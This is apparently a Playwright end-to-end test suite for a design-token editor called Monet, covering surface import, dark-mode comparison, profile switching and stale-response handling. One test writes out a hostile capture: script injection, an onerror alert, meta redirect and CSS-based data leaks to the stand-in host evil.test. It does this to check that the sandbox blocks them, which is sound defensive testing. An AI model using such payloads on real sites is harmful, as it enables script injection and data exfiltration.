import { test, expect } from "@playwright/test";
import { spawn, type ChildProcess } from "node:child_process";
import { once } from "node:events";
import { mkdtemp, rm, mkdir, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { createServer, type ViteDevServer } from "vite";
import react from "@vitejs/plugin-react";
import sharp from "sharp";

let service: ChildProcess, vite: ViteDevServer, directory: string, apiUrl: string;
const editor = "http://127.0.0.1:43148";
const input = {
  title: "ConvoGym static exercise library", context: "Synthetic data · resting desktop state", width: 1000, height: 720,
  html: `<header><b>ConvoGym</b><nav>Practice · Sessions · Settings</nav></header><main><h1>Practice a difficult conversation</h1><p>Choose a scenario and prepare your next conversation.</p><section class="cards"><article><h2>Give useful feedback</h2><p>Help a teammate understand the impact of missed deadlines.</p><button>Start</button> <a>Open exercise</a></article><article><h2>Ask for support</h2><p>Make space for a clear request and a constructive response.</p><button>Start</button> <a>Open exercise</a></article></section></main>`,
  css: `:root{--panel:#ffffff;--ink:#14283b;--accent:#245dcc}body{font-family:system-ui;background-color:var(--panel);color:var(--ink);margin:0}header{display:flex;justify-content:space-between;padding:24px;border-bottom:1px solid #ccc}main{padding:32px}h1{font-size:30px}.cards{display:grid;grid-template-columns:repeat(2,1fr);gap:20px}article{border:1px solid #ccd4de;border-radius:12px;padding:24px}button{background-color:var(--accent);color:white;padding:10px 18px;border:0;border-radius:8px}a{text-decoration:underline;font-size:14px}@media(max-width:600px){.cards{grid-template-columns:1fr}}`,
};

test.beforeAll(async () => {
  directory = await mkdtemp(path.join(tmpdir(), "monet-surface-browser-"));
  await mkdir(path.join(directory, "foundations"));
  await writeFile(path.join(directory, "foundations", "color.json"), JSON.stringify({ id: "color", name: "Color", status: "selected", description: "", rationale: "", guidance: "", notes: "", order: 0, tokens: [
    { id: "surface", name: "color.surface", foundation: "color", type: "color", level: "semantic", value: "#fff9ed", modes: { dark: "#112233" }, description: "Surface", order: 0 },
    { id: "text", name: "color.text", foundation: "color", type: "color", level: "semantic", value: "#25231c", modes: { dark: "#f3eee4" }, description: "Text", order: 1 },
    { id: "accent", name: "color.accent", foundation: "color", type: "color", level: "semantic", value: "#805328", modes: { dark: "#a06b38" }, description: "Accent", order: 2 },
  ] }));
  service = spawn(process.execPath, ["--import", "tsx", "server/index.ts"], { cwd: path.resolve(import.meta.dirname, "../.."), env: { ...process.env, MONET_ROOT: directory, MONET_LIBRARY: path.join(directory, "../" + path.basename(directory) + "-library"), MONET_PORT: "0", MONET_EDITOR_ORIGIN: editor, MONET_AI_COMMAND: "" }, stdio: ["ignore", "pipe", "pipe"] });
  apiUrl = await new Promise<string>((resolve, reject) => {
    let output = "", errors = ""; const timer = setTimeout(() => reject(new Error("Service timed out")), 15000);
    service.stderr!.on("data", (data) => { errors += data; }); service.on("exit", () => { clearTimeout(timer); reject(new Error(errors)); });
    service.stdout!.on("data", (data) => { output += data; const match = /Monet file service: (http:\/\/127\.0\.0\.1:\d+)/.exec(output); if (match) { clearTimeout(timer); resolve(match[1]!); } });
  });
  vite = await createServer({ configFile: false, root: path.resolve(import.meta.dirname, "../.."), plugins: [react()], server: { host: "127.0.0.1", port: 43148, strictPort: true, proxy: { "/api": apiUrl } } }); await vite.listen();
});
test.afterAll(async () => { await vite?.close(); if (service && service.exitCode === null && service.signalCode === null) { const exited = once(service, "exit"); service.kill(); await exited; } if (directory) await rm(directory, { recursive: true, force: true }); });

test("imports, maps, saves, reloads modes and copies evidence to Gaps in the real editor", async ({ page }) => {
  page.on("pageerror", (error) => console.error("Browser error:", error.message));
  page.on("response", (response) => { if (response.status() >= 400) console.error("HTTP error:", response.status(), response.url()); });
  await page.setViewportSize({ width: 1560, height: 1100 }); await page.goto(`${editor}/surfaces/new`);
  await page.getByLabel("Surface title", { exact: true }).fill(input.title);
  await page.getByLabel("Captured HTML", { exact: true }).fill(input.html); await page.getByLabel("Captured CSS", { exact: true }).fill(input.css);
  await page.getByLabel("Capture width", { exact: true }).fill("1000"); await page.getByLabel("Capture height", { exact: true }).fill("720");
  await page.getByRole("button", { name: "Inspect safe snapshot" }).click();
  await expect(page.getByRole("heading", { name: "Import fidelity" })).toBeVisible();
  await page.getByLabel("Token for d1", { exact: true }).selectOption("color.surface");
  await page.getByLabel("Token for d2", { exact: true }).selectOption("color.text");
  await page.getByLabel("Token for d3", { exact: true }).selectOption("color.accent");
  await page.getByRole("button", { name: "Preview approved mappings" }).click();
  const applied = page.frameLocator('iframe[title^="Monet"]');
  await expect(applied.locator("body")).toHaveCSS("background-color", "rgb(255, 249, 237)");
  await expect(page.frameLocator('iframe[title^="Original"]').locator("body")).toHaveCSS("background-color", "rgb(255, 255, 255)");
  await page.getByRole("button", { name: "Save Surface", exact: true }).click(); await expect(page).toHaveURL(/\/surfaces\/[a-f0-9-]+(?:\?profile=[a-f0-9-]+)?$/);
  await expect(page.getByRole("combobox", { name: "Target mode", exact: true })).toBeVisible({ timeout: 8000 }); await page.getByRole("combobox", { name: "Target mode", exact: true }).selectOption("dark"); await page.getByRole("button", { name: "Save comparison revision" }).click();
  await expect(page.frameLocator('iframe[title^="Monet"]').locator("body")).toHaveCSS("background-color", "rgb(17, 34, 51)");
  await page.reload(); await expect(page.getByLabel("Saved comparison revision")).toHaveValue("2");
  await page.getByLabel("Saved comparison revision").selectOption("1"); await expect(page.frameLocator('iframe[title^="Monet"]').locator("body")).toHaveCSS("background-color", "rgb(255, 249, 237)");
  await page.getByLabel("Saved comparison revision").selectOption("2");
  await expect(page.frameLocator('iframe[title^="Monet"]').locator("body")).toHaveCSS("background-color", "rgb(17, 34, 51)");
  await expect(page.frameLocator('iframe[title^="Monet"]').getByRole("heading", { name: "Practice a difficult conversation" })).toBeVisible();
  await page.getByRole("region", { name: "Surface comparison" }).scrollIntoViewIfNeeded();
  // Synchronize the newly navigated opaque frame's compositor after scrolling into view.
  await page.evaluate(() => new Promise((resolve) => requestAnimationFrame(() => requestAnimationFrame(resolve))));
  const screenshot = await page.screenshot({ path: "/tmp/monet-surfaces-v1.png" });
  const pixels = await sharp(screenshot).raw().toBuffer({ resolveWithObject: true });
  let darkPixels = 0;
  for (let i = 0; i < pixels.data.length; i += pixels.info.channels) if (pixels.data[i] === 17 && pixels.data[i + 1] === 34 && pixels.data[i + 2] === 51) darkPixels++;
  expect(darkPixels).toBeGreaterThan(10000); // Assert actual painted comparison, not only computed CSS.
  await page.setViewportSize({ width: 390, height: 844 });
  expect(await page.evaluate(() => document.documentElement.scrollWidth)).toBeLessThanOrEqual(390);
  await page.locator(".surface-issues input").first().check(); await page.getByLabel("What went wrong?", { exact: true }).fill("Repeated actions need human hierarchy review.");
  await page.getByRole("button", { name: "Report selected evidence in Gaps" }).click(); await page.getByRole("link", { name: "Open Gap", exact: true }).click();
  await expect(page.getByRole("heading", { name: "Gap report" })).toBeVisible(); await expect(page.getByText("Repeated actions need human hierarchy review.", { exact: true })).toBeVisible();
});

test("hostile captures cannot run code, fetch assets, navigate or access the parent", async ({ page, request }) => {
  await page.goto(`${editor}/surfaces`);
  const result = await request.post(`${apiUrl}/api/surface-previews`, { data: { input: { title: "Hostile", html: `<script>parent.document.body.textContent='PWNED';fetch('https://evil.test')</script><iframe src="${apiUrl}/api/workspace"></iframe><meta http-equiv=refresh content="0;url=https://evil.test"><form action="${apiUrl}/api/gaps"><button>Submit</button></form><a href="https://evil.test" target=_top>Escape</a><img src="https://evil.test/i" onerror=alert(1)><div style="background-image:url(https://evil.test/c)">Safe content</div>`, css: `@import "https://evil.test/css";@font-face{font-family:evil;src:url(https://evil.test/font)}[value^=secret]{background:url(https://evil.test/leak)}` } } });
  expect(result.ok()).toBeTruthy(); const preview = await result.json();
  const outgoing: string[] = []; page.on("request", (req) => { if (!req.url().startsWith(editor) && !req.url().startsWith("data:")) outgoing.push(req.url()); });
  let dialogs = 0; page.on("dialog", async (dialog) => { dialogs++; await dialog.dismiss(); });
  await page.evaluate(({ original }) => { const iframe = document.createElement("iframe"); iframe.id = "security-probe"; iframe.setAttribute("sandbox", ""); iframe.srcdoc = original; document.body.appendChild(iframe); }, preview);
  const frame = page.frameLocator("#security-probe"); await expect(frame.getByText("Safe content")).toBeVisible();
  await frame.getByText("Escape", { exact: true }).click(); await frame.getByRole("button", { name: "Submit" }).click();
  expect(new URL(page.url()).pathname).toBe("/surfaces"); expect(dialogs).toBe(0); expect(outgoing).toEqual([]);
  const access = await page.locator("#security-probe").evaluate((el: HTMLIFrameElement) => { try { return el.contentWindow!.document.body.innerHTML; } catch { return "opaque"; } }); expect(access).toBe("opaque");
  // Defense in depth: even an accidentally introduced script is blocked by both CSP and sandbox.
  await page.evaluate(() => { const frame = document.querySelector<HTMLIFrameElement>("#security-probe")!; frame.srcdoc = frame.srcdoc + '<script>parent.document.body.textContent="PWNED"</script>'; });
  await expect(frame.getByText("Safe content")).toBeVisible(); await expect(page.getByRole("heading", { name: "Surfaces", exact: true })).toBeVisible();
});


test("creates and switches Profiles, preserves navigation binding and discards late responses", async ({ page, request }) => {
  await page.setViewportSize({ width: 1440, height: 1000 });
  await page.goto(`${editor}/`);
  await expect(page.getByRole("combobox", { name: "Profile", exact: true })).toBeVisible();
  const originalId = await page.getByRole("combobox", { name: "Profile", exact: true }).inputValue();
  await page.getByRole("button", { name: "New profile", exact: true }).click();
  const dialog = page.getByRole("dialog", { name: "Create independent profile" });
  await dialog.getByLabel("Name", { exact: true }).fill("Independent browser profile");
  await dialog.getByLabel("Start with", { exact: true }).selectOption("scratch");
  await dialog.getByRole("button", { name: "Create profile", exact: true }).click();
  await expect(page.getByRole("combobox", { name: "Profile", exact: true })).not.toHaveValue(originalId);
  const secondId = await page.getByRole("combobox", { name: "Profile", exact: true }).inputValue();
  expect(new URL(page.url()).searchParams.get("profile")).toBe(secondId);
  await page.getByRole("link", { name: "Principles", exact: true }).click();
  await expect(page).toHaveURL(new RegExp(`/principles\\?profile=${secondId}`));
  await page.reload(); await expect(page.getByRole("combobox", { name: "Profile", exact: true })).toHaveValue(secondId);
  await page.getByRole("link", { name: "Agent context", exact: true }).click();
  await expect(page.getByText("MONET_PROFILE_ID", { exact: false }).first()).toBeVisible();
  await expect(page.locator(".agent-page")).toContainText(secondId);
  const created = await request.post(`${apiUrl}/api/profiles/${originalId}/gaps`, { data: { problem: "Late private original evidence" } });
  const gap = await created.json();
  await page.goto(`${editor}/gaps/${gap.id}?profile=${originalId}`);
  await expect(page.getByRole("button", { name: "Diagnose", exact: true })).toBeVisible();
  let release!: () => void, reached!: () => void;
  const gate = new Promise<void>((r) => { release = r; }), started = new Promise<void>((r) => { reached = r; });
  await page.route(`**/api/profiles/${originalId}/gap-diagnoses/${gap.id}`, async (route) => {
    const response = await route.fetch(); reached(); await gate;
    await route.fulfill({ response }).catch(() => undefined); // Old document may have been discarded already.
  });
  await page.getByRole("button", { name: "Diagnose", exact: true }).click(); await started;
  await page.getByRole("combobox", { name: "Profile", exact: true }).selectOption(secondId);
  await expect(page.getByRole("combobox", { name: "Profile", exact: true })).toHaveValue(secondId);
  release();
  await page.getByRole("link", { name: "Gaps", exact: true }).click();
  await expect(page.getByRole("heading", { name: "What did Monet miss?" })).toBeVisible();
  await expect(page.locator("body")).not.toContainText("Late private original evidence");
  expect(await (await request.get(`${apiUrl}/api/profiles/${secondId}/gaps`)).json()).toEqual([]);
  expect((await (await request.get(`${apiUrl}/api/profiles/${originalId}/gaps/${gap.id}`)).json()).diagnosis.profile_id).toBe(originalId);
});
